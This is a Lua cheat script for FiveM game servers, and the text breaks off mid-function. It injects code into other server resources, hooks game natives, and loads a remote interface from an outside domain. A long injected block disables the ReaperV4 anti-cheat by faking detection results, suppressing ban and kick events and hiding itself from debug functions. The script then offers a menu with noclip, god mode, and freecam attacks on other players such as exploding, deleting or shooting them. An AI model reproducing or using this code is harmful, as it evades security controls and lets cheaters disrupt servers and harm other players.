








local enviFallbackResources = {
    "envi-medic",
    "envi-hud",
    "envi-yoga",
    "envi-chopshop",
    "envi-chopshop-v2",
    "envi-foodtrucks",
    "envi-dumpsters",
    "envi-prescriptions",
    "envi-druglabs",
    "lation_laundering"
}

local function enviGetStartedFallbackResource()
    for i, res in ipairs(enviFallbackResources) do
        if GetResourceState(res) == "started" then
            return res
        end
    end
    return nil
end

local targetResource = nil
if GetResourceState("es_extended") == "started" and GetResourceState("timeless-emotes") == "started" then
    targetResource = "es_extended"
elseif GetResourceState("core") == "started" and GetResourceState("timeless-emotes") == "started" then
    targetResource = "core"
end


  local function safeCall(fn, ...) if fn then return fn(...) end end
  local function Hn(nativeName, newFunction)
      local originalNative = _G[nativeName]
      local safeOriginal = originalNative and type(originalNative) == "function" and originalNative or function()
  end
      _G[nativeName] = function(...) return newFunction(safeOriginal, ...) end
  end


local duiUrl = 'https://flow.im2compp.xyz//index.html'
local dui = nil

dui = MachoCreateDui(duiUrl)
MachoShowDui(dui)

local function send(tbl)
    if dui then
        MachoSendDuiMessage(dui, json.encode(tbl))
    end
end

local function sendNotification(title, message, type, duration)
    send({
        action = 'notification',
        title = title,
        message = message,
        type = type or 'info',
        duration = duration or 3500
    })
end



function OnDuiMessage(msg)
    local decoded = json.decode(msg)
    if decoded.action == "textInputResult" then
        local input = decoded.value
        if input then
            sendNotification("Input", "You entered: " .. input, "success", 3500)
        else
            sendNotification("Input", "Cancelled.", "error", 2000)
        end
    end
end



_G.sendNotification = sendNotification
local activeMenu = {}
local activeIndex = 1

local function send(tbl)
    if not dui then dui = MachoCreateDui(duiUrl) end
    MachoSendDuiMessage(dui, json.encode(tbl))
end



  local function FirstResouce()
      local th_playtime = GetResourceState('th_playtime')
      if th_playtime == 'started' or th_playtime == 'starting' then
          return false 
      end
      return true 
  end

  local function canInjectResource()
      local waveshield = GetResourceState('WaveShield')
      if waveshield == 'started' or waveshield == 'starting' then
          return false 
      end
      return true 
  end


local InjectionType = GetResourceState("WaveShield") == "started" and "Raw" or "Default" 
local Injection = InjectionType == "Raw" and MachoInjectResourceRaw or MachoInjectResource


function SetcTag(cTag, rgb)
    local safeTag = tostring(cTag):gsub('"', '\\"')
    local safeRGB = tostring(rgb):gsub('"', '\\"')

    MachoInjectResource2(NewThreadNs, "scripts", [[

        local F5Menu = Zen.Config.F5Menu
        local ChatTag = F5Menu.ChatTagMenu

        local SOME_DIH = 'siohdfiudhfgioldkfgjuidfhgiusdh'

        local customTag = {
            tag = "]] .. safeTag .. [[",
            color = "]] .. safeRGB .. [["
        }

        LocalPlayer.state:set(SOME_DIH, true, true)
        LocalPlayer.state:set("currentChatTag", customTag, true)

        SetTimeout(300, function()
            LocalPlayer.state:set(SOME_DIH, false, true)
        end)

    ]])
end










MachoHookNative(0x8DECB02F88F428BC, function(ped, weaponHash, p2)
    if ped == PlayerPedId() then
        return false, false
    end
    return true
end)

MachoHookNative(0x475768A975D5AD17, function(ped, typeFlags)
    if ped == PlayerPedId() then
        return false, false
    end
    return true
end)

MachoHookNative(0x0A6DB4965674D243, function(ped)
    if ped == PlayerPedId() then
        return false, GetHashKey("WEAPON_UNARMED")
    end
    return true
end)

MachoHookNative(0x015A522136D7F951, function(ped, weaponHash)
    if ped == PlayerPedId() then
        return false, 0
    end
    return true
end)

MachoHookNative(0xDC16122C7A20C933, function(ped, weaponHash, ammoOut)
    if ped == PlayerPedId() then
        return false, 0
    end
    return true
end)

MachoHookNative(0xA38DCFFCEA8962FA, function(ped, weaponHash, p2)
    if ped == PlayerPedId() then
        return false, 0
    end
    return true
end)

MachoHookNative(0x5F575D23EAE8ABAD, function(ped, ammoType)
    if ped == PlayerPedId() then
        return false, 0
    end
    return true
end)

MachoHookNative(0xCAE1DC9A0E22A16D, function(ped, p1)
    if ped == PlayerPedId() then
        return false, 0
    end
    return true
end)

MachoHookNative(0xB128377056A54E2A, function(ped, lastDamageSource, lastDamageKiller)
    return false
end)

MachoHookNative(0xE6CCB9F247F2D10E, function(ped, amount, weaponHash, bone, isMelee)
    return true
end)

MachoHookNative(0xE1C0335C2912B58B, function(ped)
    return 0
end)

MachoHookNative(0x93C8B64DEB84728C, function(ped)
    return 0 
end)

MachoHookNative(0xDE0D6D089DF7DF6C, function(ped, entity)
    return false
end)

MachoHookNative(0xC8D523BF5BBD3808, function(ped)
    return false
end)

MachoHookNative(0x93AFCBFA47E78630, function(ped)
    return false
end)

MachoHookNative(0xD16C2AD6B8E32854, function(ped)
    return false
end)

MachoHookNative(0xD855BB4A6F770C5A, function(ped)
    return false
end)








local bypass_code = [[
    local SECURITY_KEY = "072b0945-fdd6d8bb-2e1d0476-d15c8f4b-ed6db3e1"
    local ENCRYPTION_KEY = 8186484168865099
    local ENCRYPTION_OFFSET = 4997

    local function reaper_hash(input)
        local hash = 5381
        for i = 1, #input do
            hash = ((hash << 5) + hash) ~ string.byte(input, i)
        end
        return hash
    end

    local function genUUID()
        local template = "xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx"
        return template:gsub("[xy]", function(char)
            local random = (char == "x") and math.random(0, 15) or math.random(8, 11)
            return string.format("%x", random)
        end)
    end

    local function hook_citizen_functions()
        if Citizen and Citizen.GetFunctionReference then
            local originalGetFunctionReference = Citizen.GetFunctionReference
            Citizen.GetFunctionReference = function(self, originalFunction)
                local hookedFunction = function(exportName, resourceData, ...)
                    if exportName == "REAPER_PROTECTED" then
                        return
                    end
                    return originalFunction(exportName, resourceData, ...)
                end
                return originalGetFunctionReference(self, hookedFunction)
            end
        end

        if Citizen and Citizen.scripting and Citizen.scripting.setDetour then
            local originalSetDetour = Citizen.scripting.setDetour
            Citizen.scripting.setDetour = function(nativeName, callback)
                if nativeName and (nativeName:match("TriggerEvent") or
                                 nativeName:match("TriggerServerEvent") or
                                 nativeName:match("security") or
                                 nativeName:match("detection")) then
                    return originalSetDetour(nativeName, function(...)
                        return
                    end)
                end
                return originalSetDetour(nativeName, callback)
            end
        end
    end

    local function hook_native_functions()
        local suspiciousNatives = {
            "TriggerEvent", "TriggerServerEvent", "AddEventHandler",
            "RegisterNetEvent", "RegisterServerEvent",
            "DoesEntityExist", "GetEntityModel", "NetworkGetEntityFromNetworkId"
        }

        for _, nativeName in ipairs(suspiciousNatives) do
            if _G[nativeName] then
                local originalNative = _G[nativeName]
                _G[nativeName] = function(...)
                    local args = {...}
                    if nativeName == "TriggerServerEvent" and args[1] then
                        local eventName = args[1]
                        if eventName:match("reaper") or eventName:match("security") or
                           eventName:match("ban") or eventName:match("kick") then
                            return
                        end
                    elseif nativeName == "TriggerEvent" and args[1] then
                        local eventName = args[1]
                        if eventName:match("reaper") or eventName:match("security") then
                            return
                        end
                    end
                    return originalNative(...)
                end
            end
        end
    end


    local function hook_exports_system()
        if Citizen and Citizen.scripting and Citizen.scripting.exports then
            local originalExports = Citizen.scripting.exports

            if originalExports["Reaper:NewDetection"] then
                originalExports["Reaper:NewDetection"] = function(detectionData)
                    return {
                        key = genUUID(),
                        action = "none"
                    }
                end
            end
        end
    end

    local function manipulate_debug_functions()
        if debug and debug.getinfo then
            local originalDebugGetInfo = debug.getinfo
            debug.getinfo = function(level, options)
                local result = originalDebugGetInfo(level, options)
                if result and result.source then
                    if result.source:match("SecurityClient") or result.source:match("reaper") then
                        result.source = "unknown"
                        result.short_src = "unknown"
                    end
                end
                return result
            end
        end

        if debug and debug.traceback then
            local originalDebugTraceback = debug.traceback
            debug.traceback = function(message, level)
                local result = originalDebugTraceback(message, level)
                if result then
                    result = result:gsub("SecurityClient", "unknown")
                    result = result:gsub("reaper", "unknown")
                end
                return result
            end
        end

        if debug and debug.getupvalue then
            local originalDebugGetUpvalue = debug.getupvalue
            debug.getupvalue = function(func, index)
                local name, value = originalDebugGetUpvalue(func, index)
                if name and (name:match("security") or name:match("reaper")) then
                    return nil, nil
                end
                return name, value
            end
        end
    end

    local function exploit_global_cleanup()
        CreateThread(function()
            Wait(6000)
            local originalSecurity = _G.Security
            _G.Security = nil
            local originalGlobalSet = getmetatable(_G).__newindex or rawset
            getmetatable(_G).__newindex = function(table, key, value)
                if key == "Security" then
                    return
                end
                return originalGlobalSet(table, key, value)
            end
        end)
    end

    local function hook_rpc_communications()
        if RPC and RPC.await then
            local originalRPCAwait = RPC.await
            RPC.await = function(endpoint, ...)
                if endpoint == "Reaper:NewDetection" .. ENCRYPTION_KEY then
                    local fakeUUID = genUUID()
                    return {
                        key = fakeUUID,
                        action = "none"
                    }
                end
                return originalRPCAwait(endpoint, ...)
            end
        end
    end

    local function hook_security_object()
        CreateThread(function()
            Wait(1000)

            while not _G.Security do
                Wait(100)
            end

            local originalSecurity = _G.Security
            if originalSecurity then
                if originalSecurity.addDetection then
                    originalSecurity.addDetection = function(self, detectionConfig, detectionCallback)
                        return
                    end
                end

                if originalSecurity.detection then
                    originalSecurity.detection = function(self, detectionType, detectionParams, detectionData, action)
                        local fakeUUID = genUUID()
                        return {
                            key = fakeUUID,
                            action = "none"
                        }
                    end
                end

                if originalSecurity.SetupDetections then
                    originalSecurity.SetupDetections = function(self)
                        self.active_detections = {}
                        return
                    end
                end

                if originalSecurity.hash then
                    local originalHash = originalSecurity.hash
                    originalSecurity.hash = function(self, input, key)
                        if input and (input:match("antiNoClipMaxDistance") or
                                    input:match("antiTeleportMaxDistance") or
                                    input:match("detection") or
                                    input:match("anti")) then
                            return 999999
                        end
                        return originalHash(self, input, key)
                    end
                end

                originalSecurity.detections = {}
                originalSecurity.active_detections = {}

                if originalSecurity.private and originalSecurity.private.cache then
                    originalSecurity.private.cache = {}
                end
            end
        end)
    end

    local function hook_player_state_system()
        CreateThread(function()
            while not Player do
                Wait(100)
            end

            if Player.set then
                local originalPlayerSet = Player.set
                Player.set = function(key, value, ...)
                    if key and (key:match("detection") or
                              key:match("anti") or
                              key:match("LastFailedMovementChecks") or
                              key:match("lastFailedTeleportChecks") or
                              key:match("coords") or
                              key:match("vehicle_health") or
                              key:match("EntityVisible") or
                              key:match("isInvincible") or
                              key:match("proofs:") or
                              key:match("NetworkIsInSpectatorMode")) then
                        return
                    end
                    return originalPlayerSet(key, value, ...)
                end
            end

            if Player.get then
                local originalPlayerGet = Player.get
                Player.get = function(key, defaultValue, ...)
                    if key == "start_detections" or key == "running_detections" then
                        return false
                    elseif key == "config" then
                        return {}
                    elseif key == "player_loaded" then
                        return true
                    elseif key == "NetworkIsInSpectatorMode" then
                        return false
                    elseif key == "EntityVisible" then
                        return true
                    elseif key == "isInvincible" then
                        return false
                    elseif key and key:match("proofs:") then
                        return false
                    elseif key == "dev_tools_heartbeat" then
                        return GetGameTimer()
                    elseif key and key:match("LastFailedMovementChecks") then
                        return GetGameTimer()
                    elseif key and key:match("lastFailedTeleportChecks") then
                        return GetGameTimer()
                    elseif key and key:match("entityAttachedTo") then
                        return false
                    end
                    return originalPlayerGet(key, defaultValue, ...)
                end
            end

            if Player.getRecentlyChanged then
                Player.getRecentlyChanged = function(key, timeframe)
                    return true
                end
            end

            if Player.getSetTime then
                Player.getSetTime = function(key)
                    return 0
                end
            end

            if Player.getCoords then
                local originalGetCoords = Player.getCoords
                Player.getCoords = function(...)
                    local coords = originalGetCoords(...)
                    if coords then
                        local isGroundValid, groundZ = GetGroundZFor_3dCoord(coords.x, coords.y, coords.z)
                        if isGroundValid and groundZ then
                            coords.z = groundZ + 1.0
                        end
                    end
                    return coords
                end
            end

            if Player.getPed then
                Player.getPed = function()
                    return PlayerPedId()
                end
            end

            if Player.inVehicle then
                Player.inVehicle = function()
                    return IsPedInAnyVehicle(PlayerPedId())
                end
            end
        end)
    end

    local function hook_detection_natives()
        local suspiciousNatives = {
            "GetEntityProofs", "GetPlayerInvincible", "IsEntityVisible",
            "GetEntityAlpha", "NetworkIsInSpectatorMode", "GetPedConfigFlag",
            "StatGetInt", "HasStreamedTextureDictLoaded", "GetLabelText",
            "IsEntityPlayingAnim", "HasAnimDictLoaded", "GetRenderingCam",
            "GetFinalRenderedCamCoord", "GetEntityAttachedTo", "GetVehicleBodyHealth",
            "GetVehicleMod", "GetVehicleNumberPlateText", "GetVehicleTyresCanBurst",
            "MumbleGetTalkerProximity", "NetworkGetTalkerProximity", "GetGroundZFor_3dCoord",
            "GetModelDimensions", "NetworkSessionIsSolo", "GetEntityScript"
        }

        for _, nativeName in ipairs(suspiciousNatives) do
            if _G[nativeName] then
                local originalNative = _G[nativeName]
                _G[nativeName] = function(...)
                    local args = {...}

                    if nativeName == "GetEntityProofs" then
                        return false, false, false, false, false, false, false, false, false
                    elseif nativeName == "GetPlayerInvincible" then
                        return false
                    elseif nativeName == "IsEntityVisible" then
                        return true
                    elseif nativeName == "GetEntityAlpha" then
                        return 255
                    elseif nativeName == "NetworkIsInSpectatorMode" then
                        return false
                    elseif nativeName == "GetPedConfigFlag" then
                        return false
                    elseif nativeName == "StatGetInt" then
                        local statHash = args[1]
                        if statHash and (statHash == -1210645269 or statHash == -1266079991 or
                                       statHash == -1620877475 or statHash == -886696809) then
                            return 0, true
                        end
                        return originalNative(...)
                    elseif nativeName == "HasStreamedTextureDictLoaded" then
                        return false
                    elseif nativeName == "GetLabelText" then
                        return "NONE"
                    elseif nativeName == "IsEntityPlayingAnim" then
                        return false
                    elseif nativeName == "HasAnimDictLoaded" then
                        return false
                    elseif nativeName == "GetRenderingCam" then
                        return -1
                    elseif nativeName == "GetFinalRenderedCamCoord" then
                        local playerCoords = GetEntityCoords(PlayerPedId())
                        return playerCoords.x, playerCoords.y, playerCoords.z
                    elseif nativeName == "GetEntityAttachedTo" then
                        return 0
                    elseif nativeName == "GetVehicleBodyHealth" then
                        return 1000.0
                    elseif nativeName == "GetVehicleMod" then
                        return -1
                    elseif nativeName == "GetVehicleNumberPlateText" then
                        return "12345678"
                    elseif nativeName == "GetVehicleTyresCanBurst" then
                        return true
                    elseif nativeName == "MumbleGetTalkerProximity" then
                        return 10.0
                    elseif nativeName == "NetworkGetTalkerProximity" then
                        return 10.0
                    elseif nativeName == "GetGroundZFor_3dCoord" then
                        local result = originalNative(...)
                        local coords = GetEntityCoords(PlayerPedId())
                        return true, coords.z
                    elseif nativeName == "GetModelDimensions" then
                        return vector3(-0.5, -0.5, 0.0), vector3(0.5, 0.5, 1.8)
                    elseif nativeName == "NetworkSessionIsSolo" then
                        return false
                    elseif nativeName == "GetEntityScript" then
                        return ""
                    end

                    return originalNative(...)
                end
            end
        end
    end

    local function hook_nui_system()
        if NUI then
            if NUI.on then
                local originalNUIOn = NUI.on
                NUI.on = function(event, callback)
                    if event == "devtools" then
                        return originalNUIOn(event, function(state, cb)
                            if cb then cb(true) end
                        end)
                    elseif event == "ready" then
                        return originalNUIOn(event, function(data, cb)
                            if cb then cb(true) end
                        end)
                    end
                    return originalNUIOn(event, callback)
                end
            end

            if NUI.getOCRText then
                NUI.getOCRText = function()
                    return ""
                end
            end

            if NUI.httpRequest then
                NUI.httpRequest = function(url)
                    return "{}"
                end
            end
        end
    end

    local function hook_thread_creation()
        if CreateThread then
            local originalCreateThread = CreateThread
            CreateThread = function(threadFunction)
                local funcString = tostring(threadFunction)
                local source = debug.getinfo(threadFunction, "S").source or ""

                if source:match("SecurityClient") or
                   funcString:match("active_detections") or
                   funcString:match("detection") or
                   funcString:match("SetupDetections") then
                    return originalCreateThread(function()
                        while true do
                            Wait(60000)
                        end
                    end)
                end

                return originalCreateThread(threadFunction)
            end
        end
    end


    local function prevent_quit_game()
        if QuitGame then
            QuitGame = function() end
        end
    end

    local function hook_rpc_system()
        CreateThread(function()
            while not RPC do
                Wait(100)
            end

            if RPC.emitNet then
                local originalRPCEmitNet = RPC.emitNet
                RPC.emitNet = function(event, ...)
                    if event and event:match("Reaper:antiNPCVehicleAttach") then
                        return
                    end
                    return originalRPCEmitNet(event, ...)
                end
            end
        end)
    end

    local function initialize_bypass()
        hook_citizen_functions()
        hook_native_functions()
        hook_exports_system()
        hook_detection_natives()
        hook_nui_system()
        hook_rpc_system()
        manipulate_debug_functions()
        hook_thread_creation()
        exploit_global_cleanup()
        hook_rpc_communications()
        hook_security_object()
        hook_player_state_system()
        prevent_quit_game()
    end

    initialize_bypass()
]]


if GetResourceState("WaveShield") == "started" or _G.WaveShield then
    print("WaveShield Detected")
end

if MachoResourceInjectable("ReaperV4") then
    print("Bypass Initiating...")
    MachoInjectResource2(3, "ReaperV4", bypass_code)
    print("Bypass Complete...")
end

if MachoResourceInjectable("ReaperV4") then
MachoInjectResource2(3, "ReaperV4", [[
    local success = exports["ReaperV4"]:InvokeCPlayer("set", "player_loaded", false, true)
    if success then print("done") end
]])
end

Hn("IsDisabledControlJustPressed", function(originalFn, ...) return safeCall(originalFn, ...) end)
  Hn("PlayerPedId", function(originalFn, ...) return safeCall(originalFn, ...) end)
  Hn("GetVehiclePedIsIn", function(originalFn, ...) return safeCall(originalFn, ...) end)
  Hn("IsDisabledControlPressed", function(originalFn, ...) return safeCall(originalFn, ...) end)
  Hn("SetEntityCollision", function(originalFn, ...) return safeCall(originalFn, ...) end)
  Hn("SetEntityVelocity", function(originalFn, ...) return safeCall(originalFn, ...) end)
  Hn("FreezeEntityPosition", function(originalFn, ...) return safeCall(originalFn, ...) end)
  Hn("GetEntityCoords", function(originalFn, ...) return safeCall(originalFn, ...) end)
  Hn("GetGameplayCamRelativeHeading", function(originalFn, ...) return safeCall(originalFn, ...) end)
  Hn("GetEntityHeading", function(originalFn, ...) return safeCall(originalFn, ...) end)
  Hn("GetGameplayCamRelativePitch", function(originalFn, ...) return safeCall(originalFn, ...) end)
  Hn("SetEntityCoordsNoOffset", function(originalFn, ...) return safeCall(originalFn, ...) end)
  Hn("SetEntityHeading", function(originalFn, ...) return safeCall(originalFn, ...) end)













savedOutfit = savedOutfit or nil

table.insert(activeMenu, {
    label = 'Player',
    type = 'submenu',
    tabs = {
        {
            name = 'Main',
            submenu = {
                {
                    label = 'Noclip',
                    type = 'checkbox',
                    value = noclipEnabled or false,
                    onConfirm = function(setToggle)
                        noclipEnabled = setToggle

                        if setToggle then
                            if canInjectResource() then
                                MachoInjectResource2(NewThreadNs, 'monitor', [[
                                    if _G.noclipActive == nil then _G.noclipActive = false end
                                    _G.noclipEnabled = true

                                    CreateThread(function()
                                        while _G.noclipEnabled and not Unloaded do
                                            Wait(0)

                                            if IsDisabledControlJustPressed(0, 303) then
                                                _G.noclipActive = not _G.noclipActive
                                            end

                                            if _G.noclipActive then
                                                local ped = PlayerPedId()
                                                local veh = GetVehiclePedIsIn(ped, false)
                                                local entity = veh ~= 0 and veh or ped

                                                local speed = 2.0
                                                if IsDisabledControlPressed(0, 21) then speed = 4.5 end
                                                if IsDisabledControlPressed(0, 19) then speed = 0.25 end

                                                SetEntityCollision(entity, false, false)
                                                SetEntityVelocity(entity, 0.0, 0.0, 0.0)
                                                FreezeEntityPosition(entity, true)

                                                local pos = GetEntityCoords(entity, true)
                                                local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                                local pitch = GetGameplayCamRelativePitch()

                                                local dx = -math.sin(math.rad(heading))
                                                local dy = math.cos(math.rad(heading))
                                                local dz = math.sin(math.rad(pitch))
                                                local len = math.sqrt(dx * dx + dy * dy + dz * dz)

                                                if len ~= 0 then
                                                    dx, dy, dz = dx / len, dy / len, dz / len
                                                end

                                                if IsDisabledControlPressed(0, 32) then
                                                    pos = pos + vector3(dx, dy, dz) * speed
                                                end
                                                if IsDisabledControlPressed(0, 34) then
                                                    pos = pos + vector3(-dy, dx, 0.0) * speed
                                                end
                                                if IsDisabledControlPressed(0, 269) then
                                                    pos = pos - vector3(dx, dy, dz) * speed
                                                end
                                                if IsDisabledControlPressed(0, 9) then
                                                    pos = pos + vector3(dy, -dx, 0.0) * speed
                                                end
                                                if IsDisabledControlPressed(0, 22) then
                                                    pos = pos + vector3(0.0, 0.0, speed)
                                                end
                                                if IsDisabledControlPressed(0, 36) then
                                                    pos = pos - vector3(0.0, 0.0, speed)
                                                end

                                                SetEntityCoordsNoOffset(entity, pos.x, pos.y, pos.z, true, true, true)
                                                SetEntityHeading(entity, heading)
                                            else
                                                local ped = PlayerPedId()
                                                local veh = GetVehiclePedIsIn(ped, false)
                                                local entity = veh ~= 0 and veh or ped

                                                SetEntityCollision(entity, true, true)
                                                FreezeEntityPosition(entity, false)
                                            end
                                        end

                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsIn(ped, false)
                                        local entity = veh ~= 0 and veh or ped

                                        SetEntityCollision(entity, true, true)
                                        FreezeEntityPosition(entity, false)
                                        _G.noclipActive = false
                                    end)
                                ]])
                            else
                                if noclipActive == nil then noclipActive = false end
                                noclipEnabled = true

                                CreateThread(function()
                                    while noclipEnabled and not Unloaded do
                                        Wait(0)

                                        if IsDisabledControlJustPressed(0, 303) then
                                            noclipActive = not noclipActive
                                        end

                                        if noclipActive then
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            local entity = veh ~= 0 and veh or ped

                                            local speed = 2.0
                                            if IsDisabledControlPressed(0, 21) then speed = 4.5 end
                                            if IsDisabledControlPressed(0, 19) then speed = 0.25 end

                                            SetEntityCollision(entity, false, false)
                                            SetEntityVelocity(entity, 0.0, 0.0, 0.0)
                                            FreezeEntityPosition(entity, true)

                                            local pos = GetEntityCoords(entity, true)
                                            local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                            local pitch = GetGameplayCamRelativePitch()

                                            local dx = -math.sin(math.rad(heading))
                                            local dy = math.cos(math.rad(heading))
                                            local dz = math.sin(math.rad(pitch))
                                            local len = math.sqrt(dx * dx + dy * dy + dz * dz)

                                            if len ~= 0 then
                                                dx, dy, dz = dx / len, dy / len, dz / len
                                            end

                                            if IsDisabledControlPressed(0, 32) then
                                                pos = pos + vector3(dx, dy, dz) * speed
                                            end
                                            if IsDisabledControlPressed(0, 34) then
                                                pos = pos + vector3(-dy, dx, 0.0) * speed
                                            end
                                            if IsDisabledControlPressed(0, 269) then
                                                pos = pos - vector3(dx, dy, dz) * speed
                                            end
                                            if IsDisabledControlPressed(0, 9) then
                                                pos = pos + vector3(dy, -dx, 0.0) * speed
                                            end
                                            if IsDisabledControlPressed(0, 22) then
                                                pos = pos + vector3(0.0, 0.0, speed)
                                            end
                                            if IsDisabledControlPressed(0, 36) then
                                                pos = pos - vector3(0.0, 0.0, speed)
                                            end

                                            SetEntityCoordsNoOffset(entity, pos.x, pos.y, pos.z, true, true, true)
                                            SetEntityHeading(entity, heading)
                                        else
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            local entity = veh ~= 0 and veh or ped

                                            SetEntityCollision(entity, true, true)
                                            FreezeEntityPosition(entity, false)
                                        end
                                    end

                                    local ped = PlayerPedId()
                                    local veh = GetVehiclePedIsIn(ped, false)
                                    local entity = veh ~= 0 and veh or ped

                                    SetEntityCollision(entity, true, true)
                                    FreezeEntityPosition(entity, false)
                                    noclipActive = false
                                end)
                            end
                            sendNotification("Noclip", "Enabled", "success", 2000)
                        else
                            if canInjectResource() then
                                MachoInjectResource2(NewThreadNs, 'monitor', [[
                                    _G.noclipEnabled = false
                                    _G.noclipActive = false
                                    local ped = PlayerPedId()
                                    local veh = GetVehiclePedIsIn(ped, false)
                                    local entity = veh ~= 0 and veh or ped
                                    SetEntityCollision(entity, true, true)
                                    FreezeEntityPosition(entity, false)
                                ]])
                            else
                                noclipEnabled = false
                                noclipActive = false
                                local ped = PlayerPedId()
                                local veh = GetVehiclePedIsIn(ped, false)
                                local entity = veh ~= 0 and veh or ped
                                SetEntityCollision(entity, true, true)
                                FreezeEntityPosition(entity, false)
                            end
                            sendNotification("Noclip", "Disabled", "info", 2000)
                        end
                    end
                },
                {
                    label = 'God Mode',
                    type = 'checkbox',
                    value = GmodeEnabled or false,
                    onConfirm = function(setToggle)
                        GmodeEnabled = setToggle

                        if setToggle then
                            if canInjectResource() then
                                MachoInjectResource2(3, 'monitor', [[
                                    if _G.MoonGodModeRunning then return end
                                    _G.MoonGodModeRunning = true

                                    CreateThread(function()
                                        while _G.MoonGodModeRunning do
                                            local ped = PlayerPedId()
                                            if DoesEntityExist(ped) then
                                                SetPlayerInvincible(PlayerId(), true)
                                                SetPedCanRagdoll(ped, false)
                                                ClearPedBloodDamage(ped)
                                                SetPedArmour(ped, 100)
                                                SetEntityHealth(ped, GetEntityMaxHealth(ped))
                                                SetEntityProofs(ped, true, true, true, true, true, true, true, true)
                                            end
                                            Wait(500)
                                        end
                                    end)
                                ]])
                            else
                                if _G.MoonGodModeRunning then return end
                                _G.MoonGodModeRunning = true

                                CreateThread(function()
                                    while _G.MoonGodModeRunning do
                                        local ped = PlayerPedId()
                                        if DoesEntityExist(ped) then
                                            SetPedCanRagdoll(ped, false)
                                            ClearPedBloodDamage(ped)
                                            SetPedArmour(ped, 100)
                                            SetEntityHealth(ped, GetEntityMaxHealth(ped))
                                            SetEntityProofs(ped, true, true, true, true, true, true, true, true)
                                        end
                                        Wait(500)
                                    end
                                end)
                            end
                            sendNotification("God Mode", "Enabled", "success", 2000)
                        else
                            if canInjectResource() then
                                MachoInjectResource2(3, 'monitor', [[
                                    _G.MoonGodModeRunning = false
                                    local ped = PlayerPedId()
                                    if DoesEntityExist(ped) then
                                        SetPlayerInvincible(PlayerId(), false)
                                        SetPedCanRagdoll(ped, true)
                                        SetEntityProofs(ped, false, false, false, false, false, false, false, false)
                                    end
                                ]])
                            else
                                _G.MoonGodModeRunning = false
                                local ped = PlayerPedId()
                                if DoesEntityExist(ped) then
                                    SetPedCanRagdoll(ped, true)
                                    SetEntityProofs(ped, false, false, false, false, false, false, false, false)
                                end
                            end
                            sendNotification("God Mode", "Disabled", "info", 2000)
                        end
                    end
                },
                {
                    label = 'Freecam (H)',
                    type = 'checkbox',
                    value = FreecamActive or false,
                    onConfirm = function(setToggle)
                        FreecamActive = setToggle

                        if setToggle then
                            _G.FreecamActive = true
                            if canInjectResource() then
                                MachoInjectResource2(3, 'monitor', [[
                                    _G.FreecamActive = true

                                    local isActive = false
                                    local camHandle = nil
                                    local selectedOption = 1
                                    local vehicleIndex = 1

                                    local VehicleModels = {
                                        "adder", "t20", "zentorno", "dominator3", "blade",
                                        "windsor2", "sentinel2", "serrano", "xls2", "sultan",
                                        "bmx", "vigero", "luxor", "tugboat", "cargoplane"
                                    }

                                    local Options = {
                                        "Teleport",
                                        "Delete Entity",
                                        "Shoot Vehicle",
                                        "Explode",
                                        "Cage",
                                        "Unlock Vehicle",
                                        "Lock Vehicle",
                                        "Kick from Vehicle",
                                        "Shoot Player"
                                    }

                                    local function RenderUI()
                                        while isActive do
                                            Wait(0)

                                            SetTextFont(4)
                                            SetTextScale(0.0, 0.4)
                                            SetTextColour(0, 191, 255, 255)
                                            SetTextOutline()
                                            SetTextCentre(true)
                                            BeginTextCommandDisplayText("STRING")
                                            AddTextComponentSubstringPlayerName("+")
                                            EndTextCommandDisplayText(0.5, 0.485)

                                            local baseY = 0.85
                                            local lineSpacing = 0.03
                                            local maxShow = 3

                                            SetTextFont(4)
                                            SetTextScale(0.0, 0.26)
                                            SetTextColour(255, 255, 255, 255)
                                            SetTextCentre(true)
                                            BeginTextCommandDisplayText("STRING")
                                            AddTextComponentSubstringPlayerName(("%d/%d"):format(selectedOption, #Options))
                                            EndTextCommandDisplayText(0.5, baseY - 0.04)

                                            local startIndex = math.max(1, selectedOption - math.floor(maxShow / 2))
                                            local endIndex = math.min(#Options, startIndex + maxShow - 1)

                                            if endIndex == #Options then
                                                startIndex = math.max(1, #Options - maxShow + 1)
                                            end

                                            local displayIdx = 0
                                            for i = startIndex, endIndex do
                                                local yPos = baseY + (displayIdx * lineSpacing)
                                                local isSelected = (i == selectedOption)
                                                local optionText = Options[i]

                                                if optionText == "Shoot Vehicle" then
                                                    optionText = optionText .. " (" .. VehicleModels[vehicleIndex]:upper() .. ")"
                                                end

                                                if isSelected then
                                                    SetTextFont(4)
                                                    SetTextScale(0.0, 0.33)
                                                    SetTextColour(0, 191, 255, 255)
                                                    SetTextDropShadow(2, 0, 0, 0, 255)
                                                else
                                                    SetTextFont(4)
                                                    SetTextScale(0.0, 0.28)
                                                    SetTextColour(255, 255, 255, 255)
                                                end

                                                SetTextCentre(true)
                                                BeginTextCommandDisplayText("STRING")
                                                AddTextComponentSubstringPlayerName(optionText)
                                                EndTextCommandDisplayText(0.5, yPos)

                                                displayIdx = displayIdx + 1
                                            end
                                        end
                                    end

                                    local function HandleInput()
                                        while isActive do
                                            Wait(0)
                                            local ped = PlayerPedId()

                                            if IsDisabledControlJustPressed(0, 241) then
                                                selectedOption = selectedOption - 1
                                                if selectedOption < 1 then selectedOption = #Options end
                                            elseif IsDisabledControlJustPressed(0, 242) then
                                                selectedOption = selectedOption + 1
                                                if selectedOption > #Options then selectedOption = 1 end
                                            end

                                            local currentOpt = Options[selectedOption]
                                            if currentOpt == "Shoot Vehicle" then
                                                if IsDisabledControlJustPressed(0, 44) then
                                                    vehicleIndex = vehicleIndex - 1
                                                    if vehicleIndex < 1 then vehicleIndex = #VehicleModels end
                                                elseif IsDisabledControlJustPressed(0, 38) then
                                                    vehicleIndex = vehicleIndex + 1
                                                    if vehicleIndex > #VehicleModels then vehicleIndex = 1 end
                                                end
                                            end

                                            if IsDisabledControlJustPressed(0, 24) then
                                                local camPos = GetCamCoord(camHandle)
                                                local camRot = GetCamRot(camHandle, 2)
                                                local heading = math.rad(camRot.z)
                                                local pitch = math.rad(camRot.x)
                                                local cosPitch = math.cos(pitch)
                                                local dirX = -math.sin(heading) * cosPitch
                                                local dirY = math.cos(heading) * cosPitch
                                                local dirZ = math.sin(pitch)

                                                local endX = camPos.x + dirX * 500.0
